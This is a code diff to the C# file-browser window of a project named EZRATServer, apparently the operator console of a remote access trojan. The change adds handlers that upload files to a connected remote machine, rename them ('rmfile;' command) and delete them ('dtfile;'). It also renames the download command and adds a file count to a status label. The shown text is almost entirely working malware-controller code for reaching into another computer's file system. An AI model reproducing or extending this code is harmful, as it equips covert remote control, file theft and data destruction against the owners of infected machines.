@@ -8,11 +8,15 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using EZRATServer.Network;
+using EZRATServer.Forms;
 
 namespace EZRATServer
 {
     public partial class FileBrowser : Form
     {
+
+
+        const string STATUS_TEXT = "Number of files and folder : ";
 
         private int _id;
 
@@ -60,13 +64,43 @@ namespace EZRATServer
             this.cmbDrives.SelectedIndexChanged += UpdatePath;
             this.lstFiles.MouseDoubleClick += NewPath;
             this.downloadMenu.Click += DownloadFile;
+            this.uploadMenu.Click += UploadFile;
+            this.renameMenu.Click += RenameFile;
+            this.deleteMenu.Click += DeleteFile;
             this.picUp.Click += UpPath;
         }
 
-        private void DownloadFile(object sender,EventArgs e)
+        private void DownloadFile(object sender, EventArgs e)
         {
             this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
-            this.BaseWindows.SendCommand("dfile;" + this.PathDownload , this.Id);
+            this.BaseWindows.SendCommand("dlfile;" + this.PathDownload, this.Id);
+        }
+
+        private void UploadFile(object sender, EventArgs e)
+        {
+            OpenFileDialog opf = new OpenFileDialog();
+            opf.Multiselect = false;
+
+            if (opf.ShowDialog() == DialogResult.OK)
+            {
+                this.BaseWindows.SendFile(opf.FileName, this.lblPath.Text, this.Id);
+            }
+        }
+
+        private void RenameFile(object sender, EventArgs e)
+        {
+            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+            RenameFile rn = new RenameFile(PathDownload);
+            if (rn.ShowDialog() == DialogResult.OK)
+            {
+            this.BaseWindows.SendCommand("rmfile;" + this.PathDownload + ";" + rn.FileName, this.Id);
+            }
+        }
+
+        private void DeleteFile(object sender, EventArgs e)
+        {
+            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+            this.BaseWindows.SendCommand("dtfile;" + this.PathDownload, this.Id);
         }
 
         private void UpPath(object sender, EventArgs e)
@@ -116,6 +150,8 @@ namespace EZRATServer
             // Tarte.cs¦File|Poulpe.cs¦File|
             StringBuilder sb = new StringBuilder(list);
             string name = string.Empty;
+            uint count = 0;
+            this.lblStatus.Text = STATUS_TEXT + "Calculate";
             for (int i = 0; i < sb.Length; i++)
             {
                 if (sb[i] == separator1)
@@ -125,12 +161,14 @@ namespace EZRATServer
                         AddFileOrFolder(name, FileType.File);
                         name = string.Empty;
                         i += 3;
+                        count += 1;
                     }
                     else
                     {
                         AddFileOrFolder(name, FileType.Folder);
                         name = string.Empty;
                         i += 3;
+                        count += 1;
                     }
                 }
                 if (i <= sb.Length - 1)
@@ -139,6 +177,7 @@ namespace EZRATServer
                 }
             }
 
+            this.lblStatus.Text = STATUS_TEXT + count.ToString();
             lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)));
 
             lstFiles.Invoke(new MethodInvoker(() => lstFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)));
